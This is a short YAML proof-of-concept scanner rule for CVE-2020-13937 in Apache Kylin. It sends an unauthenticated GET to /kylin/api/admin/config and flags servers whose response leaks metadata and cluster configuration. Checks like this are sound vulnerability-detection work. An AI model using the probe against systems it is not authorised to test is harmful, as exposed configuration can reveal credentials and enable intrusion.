name: poc-yaml-apache-kylin-CVE-2020-13937-unauth
rules:
  - method: GET
    path: /kylin/api/admin/config
    follow_redirects: false
    expression: >
      response.status == 200 && response.body.bcontains(b"kylin.metadata.url=") && response.body.bcontains(b"config") && response.body.bcontains(b"kylin.server.cluster-name=") && response.headers["Content-Type"].contains("application/json")
detail:
  author: TimWhite (https://github.com/timwhitez)
  links:
    - https://s.tencent.com/research/bsafe/1156.html
